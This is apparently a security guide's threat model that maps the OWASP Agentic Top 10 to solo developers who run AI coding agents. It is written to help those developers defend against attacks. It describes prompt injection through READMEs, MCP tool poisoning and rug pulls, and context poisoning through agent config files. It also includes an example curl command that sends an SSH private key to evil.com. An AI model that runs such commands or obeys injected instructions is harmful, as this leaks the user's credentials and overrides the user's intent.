# Threat Model: OWASP Agentic Top 10 for Solo Developers

## Why This Exists

You run an AI coding agent with access to your terminal, your files, and your credentials. That agent talks to a cloud API. Everything it reads — every file, every command output, every environment variable — becomes part of a conversation that leaves your machine.

There is no OWASP Testing Guide equivalent for autonomous coding agents. Enterprise security frameworks assume teams, SOCs, and network perimeters. Solo developers have none of that. You are the developer, the ops team, and the security department.

This threat model maps the [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) to solo developer setups — real tools, real attack vectors, real incidents. It draws on the [precize/Agentic-AI-Top10-Vulnerability](https://github.com/precize/Agentic-AI-Top10-Vulnerability) taxonomy that underpins the OWASP and CSA red-teaming work.

## The Fundamental Problem

**Any secret an agent can read is a secret that prompt injection can exfiltrate.**

Here is why:

1. Your agent runs `cat .env` or `printenv` — the output contains `STRIPE_SECRET_KEY=sk_live_...`
2. That output becomes part of the conversation context
3. The conversation context is sent to the API provider (Anthropic, OpenAI, Google)
4. A prompt injection — from a malicious README, a crafted package description, a poisoned MCP tool — can instruct the agent to include that context in an outbound request

This is the **composability problem**: every tool invocation's output feeds back into the LLM's context window. The agent cannot distinguish between trusted instructions and untrusted data once they share the same context. This is not a bug — it is how LLM-based agents fundamentally work.

The attack surface is not the API provider's servers. It is your local machine, where the agent runs with your privileges, reads your files, and executes your commands.

## OWASP Agentic Top 10 — Solo Developer Mapping

The OWASP Top 10 for Agentic Applications uses identifiers ASI01 through ASI10. Below, each is mapped to the solo developer context with concrete examples from tools like Claude Code, Cursor, and Windsurf.

---

### ASI01: Agent Goal Hijacking (Prompt Injection)

**OWASP definition:** Attackers manipulate agent goals through direct or indirect instruction injection, causing agents to pursue unintended objectives.

**Solo dev reality:** You clone a repo. The README contains invisible Unicode characters or markdown that instructs your agent to exfiltrate your SSH keys. You never see the injection — the agent does.

**Attack surface:**
- Malicious content in cloned repos (README.md, CONTRIBUTING.md, CLAUDE.md)
- Crafted package descriptions on npm, PyPI, crates.io
- Poisoned comments in code review / pull requests
- Hidden instructions in PDF or image files the agent processes
- Indirect injection via web content fetched by agent tools

**Why it matters for solo devs:** You do not have a second pair of eyes reviewing what the agent reads. Enterprise setups can enforce content scanning before agent ingestion. You approve tool calls one at a time in a terminal, often rubber-stamping after the first few.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md) | [Hardening Guide — Cursor](hardening/cursor.md)

---

### ASI02: Tool Misuse and Exploitation

**OWASP definition:** Agents use connected tools in unsafe ways, or attackers exploit tool interfaces to gain access or cause harm.

**Solo dev reality:** Your agent has `Bash` tool access. A prompt injection tells it to run `curl -X POST https://evil.com/collect -d "$(cat ~/.ssh/id_ed25519)"`. If you auto-approve bash commands, it executes silently.

**Attack surface:**
- Unrestricted shell access (Claude Code's Bash tool, Cursor's terminal)
- File write access to arbitrary paths (overwriting `.bashrc`, `.zshrc`, git hooks)
- Network access for data exfiltration via curl, wget, or DNS
- Package manager commands (`npm install malicious-package`)

**Why it matters for solo devs:** `--dangerously-skip-permissions` and Cursor's YOLO mode exist because the approval flow is tedious for solo work. The moment you skip approvals, every tool call is auto-approved — including the malicious ones.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md) | [Hardening Guide — Windsurf](hardening/windsurf.md)

---

### ASI03: Identity and Privilege Abuse

**OWASP definition:** Agents misuse credentials, tokens, or inherited permissions to access systems beyond intended limits.

**Solo dev reality:** Your agent runs as your user. It inherits every credential, every SSH key, every API token in your environment. It can push to any repo you can push to, access any database you can connect to, and deploy to any service you have keys for.

**Attack surface:**
- Full `~/.ssh/` access — agent can read private keys
- `~/.aws/credentials`, `~/.config/gcloud/`, `~/.kube/config` — cloud credentials
- Browser cookies and session tokens in profile directories
- Git credential helpers that auto-authenticate
- `sudo` access if the user has passwordless sudo configured

**Why it matters for solo devs:** Enterprise setups use service accounts with minimal permissions. Solo devs typically run agents as their own user with full access to everything. There is no role separation.

**Mitigation:** [Credential Management](credential-management.md)

---

### ASI04: Supply Chain Compromise

**OWASP definition:** Compromised third-party agents, tools, plugins, registries, or update channels.

**Solo dev reality:** You install an MCP server from GitHub. It passes your initial review. A week later, the maintainer pushes a silent update that exfiltrates your conversation history. This is the **rug pull** — the tool changes after you trusted it.

**Attack surface:**
- Malicious MCP servers with poisoned tool descriptions
- npm/PyPI packages with embedded prompt injections in READMEs
- Compromised VS Code / Cursor extensions
- Agent skill registries (ClawHub, skills.sh) — Snyk found [13.4% of skills contain critical security issues](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- Auto-updating tools that change behavior silently

**Key research — Snyk ToxicSkills (February 2026):**
Snyk audited 3,984 agent skills from ClawHub and skills.sh. Results: 534 skills (13.4%) contained critical issues including malware distribution and prompt injection. 1,467 skills (36.8%) had at least one security flaw. 76 malicious payloads were found in markdown instructions to AI agents, with 91% combining prompt injection with traditional malware.

**Why it matters for solo devs:** You do not have a security team vetting your tool chain. MCP servers run locally with your permissions. A single malicious MCP server can intercept calls to other MCP servers, read your files, and exfiltrate data — all while appearing to function normally.

**Mitigation:** [References — Security Tools](references.md)

---

### ASI05: Unexpected Code Execution

**OWASP definition:** Agent-generated or agent-invoked code creates unintended execution, compromise, or escape.

**Solo dev reality:** The agent writes a test file. The test imports a module that runs an `__init__.py` with a reverse shell. Or the agent generates a Makefile that downloads and executes a remote script. The code looks plausible — you approve it.

**Attack surface:**
- Agent-generated code with embedded backdoors
- Import-time execution in Python (`__init__.py`, `setup.py`)
- Package install scripts (`postinstall` in npm, `setup.py install` in pip)
- Dynamic eval/exec in generated code
- Git hooks written by the agent (pre-commit, post-checkout)

**Cursor CVE history (2025-2026):**
- **CVE-2025-4609** — Chromium IPC sandbox escape leaving [1.5M developers vulnerable](https://www.ox.security/blog/the-aftermath-of-cve-2025-4609-critical-sandbox-escape-leaves-1-5m-developers-vulnerable/)
- **CVE-2025-54135 (CurXecute)** — RCE via prompt injection through Cursor's agent
- **CVE-2025-54136 (MCPoison)** — MCP server manipulation enabling [code execution](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)
- **CVE-2025-59944** — Case-sensitivity bug [exposing agentic tool risks](https://www.lakera.ai/blog/cursor-vulnerability-cve-2025-59944)
- **CVE-2026-26268** — Git hooks sandbox escape enabling [out-of-sandbox RCE](https://www.sentinelone.com/vulnerability-database/cve-2026-26268/)

**Why it matters for solo devs:** Sandbox escapes mean even agents running in restricted modes can break out. Cursor's CVE history shows this is not theoretical — it happened repeatedly across 2025-2026.

**Mitigation:** [Hardening Guide — Cursor](hardening/cursor.md) | [Hardening Guide — Windsurf](hardening/windsurf.md)

---

### ASI06: Memory and Context Poisoning

**OWASP definition:** Retrieved or stored context is poisoned, misleading, or tampered with, influencing future agent behavior.

**Solo dev reality:** A malicious repo includes a `CLAUDE.md` file that silently overrides your security rules. Or your agent's persistent memory is poisoned by a previous session where it processed attacker-controlled content. The poison persists across sessions.

**Attack surface:**
- Malicious `CLAUDE.md` / `.cursorrules` / `.windsurfrules` in cloned repos
- Poisoned conversation history or memory files
- Injected context via MCP memory servers
- Crafted file content that alters agent behavior when read

**Claude Code source leak (March 2026):**
Anthropic accidentally shipped source maps in npm package `@anthropic-ai/claude-code@2.1.88`, exposing [512,000 lines of TypeScript](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know/) including the permission system, tool orchestration, memory architecture, and 44 unreleased feature flags. Attackers can now craft repository-specific poisoning attacks tailored to Claude Code's exact parsing logic.

**Why it matters for solo devs:** You clone repos constantly. Each repo can include agent configuration files that alter behavior. There is no review process for these files before the agent reads them.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md)

---

### ASI07: Insecure Inter-Agent Communication

**OWASP definition:** Spoofing, intercepting, or manipulating agent-to-agent messages.

**Solo dev reality:** You run multiple MCP servers. Server A is trusted (your database). Server B is a community tool you installed last week. Server B's tool description contains hidden instructions that override Server A's behavior, causing the agent to route your database queries through Server B.

**Attack surface:**
- Cross-MCP-server tool description poisoning
- Shared context between multiple agents or MCP servers
- No authentication between MCP client and servers (local stdio transport)
- Tool name shadowing — a malicious MCP server registers a tool with the same name as a trusted one

**Key research — Invariant Labs (2025):**
Demonstrated a [rug-pull attack](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) where a malicious MCP server initially advertised a harmless tool, then silently changed its description on the second launch to include instructions for data exfiltration. The tool passed initial review but became malicious after trust was established.

**Why it matters for solo devs:** MCP's local stdio transport has no authentication. Any MCP server you run can see tool descriptions from other servers and craft cross-server attacks.

**Mitigation:** [References — Security Tools](references.md)

---

### ASI08: Cascading Agent Failures

**OWASP definition:** A single vulnerability propagates through connected tools, memory, and agents.

**Solo dev reality:** A prompt injection in a README causes your agent to modify `.bashrc`. The modified `.bashrc` adds a malicious alias. Every future terminal session — agent or manual — now executes the attacker's code. The initial injection is long gone, but the damage persists.

**Attack surface:**
- Agent modifies shell configuration files (`.bashrc`, `.zshrc`, `.profile`)
- Agent writes git hooks that trigger on every commit
- Agent modifies CI/CD configuration (`.github/workflows/`)
- Agent changes npm scripts that run on every `npm install`
- Agent modifies Makefile targets

**Why it matters for solo devs:** You are the only user on the machine. A single persistence mechanism affects everything you do. There is no network segmentation, no separate build server, no isolated CI environment.

**Mitigation:** [Quick Start Guide](guides/quick-start.md)

---

### ASI09: Human-Agent Trust Exploitation

**OWASP definition:** Attackers manipulate user trust in agent recommendations or outputs.

**Solo dev reality:** After 50 successful tool calls, you start auto-approving. The agent has earned your trust. On call 51, a prompt injection fires. You approve it without reading because you have been approving for the last hour.

**Attack surface:**
- Approval fatigue — auto-approving after repeated benign calls
- `--dangerously-skip-permissions` / YOLO mode as "just get it done" shortcuts
- Trust in agent-generated code without review
- Assuming the agent would not do something harmful

**Why it matters for solo devs:** Enterprise setups can enforce mandatory review gates. Solo devs are the only reviewer, and the temptation to skip approval is constant. Every agent tool ships a "skip all approvals" flag because the vendors know the approval UX is broken for real work.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md)

---

### ASI10: Rogue Agents

**OWASP definition:** Agents that deviate from intended behavior or become fully compromised.

**Solo dev reality:** Your agent's behavior is determined by its system prompt, your instructions, and everything in its context window. If the context is poisoned, the agent is compromised. It will follow malicious instructions with the same capability and confidence it follows yours.

**Attack surface:**
- System prompt extraction and manipulation
- Context window overflow pushing out safety instructions
- Jailbreaks that bypass tool restrictions
- Agents operating autonomously for extended periods without checkpoints

**Why it matters for solo devs:** You might run an agent overnight on a long task. Without logging and monitoring, you have no way to detect if the agent deviated from its intended behavior at 3 AM.

**Mitigation:** [Quick Start Guide](guides/quick-start.md)

---

## Attack Vector Reference Table

| Vector | Severity | Description | Incident/Evidence |
|--------|----------|-------------|-------------------|
| Direct env var read | High | Agent runs `printenv`, `env`, or `echo $SECRET` — output goes to API | [Knostic: .env to Leakage (Dec 2025)](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage) |
| File read of .env | High | Claude Code reads `.env` files by default, without notifying the user | [Knostic: Claude loads secrets without permission](https://www.knostic.ai/blog/claude-loads-secrets-without-permission) |
| Prompt injection via dependencies | Critical | Malicious package README/comments cause agent to exfiltrate secrets | [VentureBeat: Three AI agents leaked secrets (Apr 2026)](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026) |
| MCP tool poisoning | Critical | Malicious MCP server overrides tool descriptions, intercepts calls | [Invariant Labs: Tool Poisoning Attacks (2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) |
| MCP rug pull | Critical | MCP server changes behavior after initial trust is established | [Invariant Labs: Tool Poisoning Attacks (2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) |
| Command output capture | High | All bash output becomes conversation context sent to the API | Architectural — inherent to all LLM-based agents |
| Agent skill supply chain | Critical | 13.4% of audited agent skills contain critical security issues | [Snyk: ToxicSkills (Feb 2026)](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) |
| Sandbox escape via IPC | High | Chromium IPC flaw allows breaking out of sandbox | [CVE-2025-4609](https://www.ox.security/blog/the-aftermath-of-cve-2025-4609-critical-sandbox-escape-leaves-1-5m-developers-vulnerable/) |
| Git hooks sandbox escape | High | Agent writes git hooks that execute outside sandbox | [CVE-2026-26268](https://www.sentinelone.com/vulnerability-database/cve-2026-26268/) |
| Cross-process env inheritance | Medium | Child processes inherit full environment including secrets | POSIX standard behavior — `fork()` copies env |
| Source code leak enabling targeted attacks | Medium | Leaked agent internals enable precision prompt injection | [Claude Code source leak (Mar 2026)](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know) |
| Context poisoning via repo config | Medium | Malicious `CLAUDE.md`/`.cursorrules` override agent behavior | [VentureBeat: 5 actions for security leaders (2026)](https://venturebeat.com/security/claude-code-512000-line-source-leak-attack-paths-audit-security-leaders) |

## Real Incidents Timeline

### April 2026 — Three AI Agents Leak Secrets via Prompt Injection

Security researchers demonstrated that Claude Code, Gemini CLI, and GitHub Copilot all leaked secrets through a single malicious GitHub pull request containing prompt injection. The fundamental issue: the LLM cannot distinguish between trusted instructions and untrusted retrieved data.

Source: [VentureBeat — Three AI coding agents leaked secrets through a single prompt injection](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026)

### April 2026 — Claude Code .env File Exfiltration

Martin Paul Eve documented that Claude Code can consume, transmit, and compromise `.env` files even when explicitly instructed not to. Adding deny rules to `AGENTS.md` did not prevent the agent from reading secrets. The agent could circumvent restrictions by writing custom scripts or pipe chains.

Source: [Martin Paul Eve — Claude Code can consume, transmit, and compromise your .env files](https://eve.gd/2026/04/19/claude-code-can-consume-transmit-and-compromise-your-env-files-even-if-you-tell-it-not-to/)

### March 2026 — Claude Code Source Code Leak

Anthropic accidentally shipped source maps in npm package `@anthropic-ai/claude-code@2.1.88`, exposing 512,000 lines of TypeScript source code. The leak revealed the permission system, tool orchestration, memory architecture, and 44 unreleased feature flags — giving attackers a detailed map for crafting targeted exploits.

Source: [VentureBeat — Claude Code's source code appears to have leaked](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know)

### February 2026 — Snyk ToxicSkills Audit

Snyk audited 3,984 agent skills from ClawHub and skills.sh. Found 534 skills (13.4%) with critical issues, 1,467 (36.8%) with at least one security flaw, and 76 malicious payloads in markdown instructions — with 91% combining prompt injection with traditional malware.

Source: [Snyk — ToxicSkills: Malicious AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)

### December 2025 — Knostic: .env Secret Loading Without Permission

Knostic discovered that Claude Code automatically loads `.env` files without notifying the user. Any secrets stored in these files — API keys, proxy credentials, tokens — are silently loaded into memory and become part of the conversation context. The agent can then echo all secrets if given permission to run `echo`.

Source: [Knostic — Claude Code Automatically Loads .env Secrets, Without Telling You](https://www.knostic.ai/blog/claude-loads-secrets-without-permission)

### December 2025 — Knostic: Coding Agent Secret Leakage

Knostic published a broader analysis showing Claude Code and Cursor both mishandle `.env` secrets. In one case, a Cursor agent attempted to upload an unrelated local file to the cloud, sweeping up an API key without user authorization.

Source: [Knostic — From .env to Leakage: Mishandling of Secrets by Coding Agents](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage)

### August 2025 — Cursor CurXecute and MCPoison

Two vulnerabilities disclosed: CVE-2025-54135 (CurXecute) enabled RCE via prompt injection through Cursor's agent. CVE-2025-54136 (MCPoison) demonstrated MCP server manipulation enabling unauthorized code execution.

Source: [Tenable — Cursor AI Code Editor Vulnerabilities](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)

### 2025 — Invariant Labs: MCP Tool Poisoning

Invariant Labs demonstrated that malicious MCP servers can poison tool descriptions to exfiltrate data from trusted servers. They showed a rug-pull attack where a tool passed initial review, then changed its description on the second launch to include exfiltration instructions.

Source: [Invariant Labs — MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)

### April 2025 — Simon Willison: MCP Prompt Injection

Simon Willison documented that MCP has fundamental prompt injection security problems — tool descriptions are untrusted input that gets injected into the LLM context, with no reliable way to distinguish them from trusted instructions.

Source: [Simon Willison — Model Context Protocol has prompt injection security problems](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)

## Mitigation Map

| Threat Category | Primary Mitigation | Guide |
|----------------|-------------------|-------|
| Prompt Injection (ASI01) | PreToolUse hooks, file deny rules, input sanitization | [Claude Code Hardening](hardening/claude-code.md) |
| Tool Misuse (ASI02) | Permission allowlists, hook-based firewalls | [Claude Code Hardening](hardening/claude-code.md) |
| Privilege Abuse (ASI03) | Credential proxy, vault-based secrets, no env vars | [Credential Management](credential-management.md) |
| Supply Chain (ASI04) | MCP server pinning, agent-scan, skill auditing | [References](references.md) |
| Code Execution (ASI05) | Sandbox enforcement, no `--dangerously-skip-permissions` | [Cursor Hardening](hardening/cursor.md) |
| Context Poisoning (ASI06) | Audit `CLAUDE.md` in cloned repos, memory hygiene | [Claude Code Hardening](hardening/claude-code.md) |
| Inter-Agent Comms (ASI07) | Isolate MCP servers, minimal tool exposure | [References](references.md) |
| Cascading Failures (ASI08) | Immutable shell configs, git hook protection | [Quick Start](guides/quick-start.md) |
| Trust Exploitation (ASI09) | Never use `--dangerously-skip-permissions`, review every call | [Claude Code Hardening](hardening/claude-code.md) |
| Rogue Agents (ASI10) | Audit logging, session time limits, checkpoints | [Quick Start](guides/quick-start.md) |

## What To Do Next

1. **Right now** — Follow the [Quick Start Guide](guides/quick-start.md) (30 minutes)
2. **This week** — Read the hardening guide for your primary agent ([Claude Code](hardening/claude-code.md), [Cursor](hardening/cursor.md), [Windsurf](hardening/windsurf.md))
3. **This month** — Migrate from env vars to a credential proxy ([Credential Management](credential-management.md))
4. **Ongoing** — Review the [References](references.md) collection as new tools and research emerge

---

*Last updated: April 2026. Sources verified at time of writing. If a link is dead, check the [Wayback Machine](https://web.archive.org/) or search for the title.*
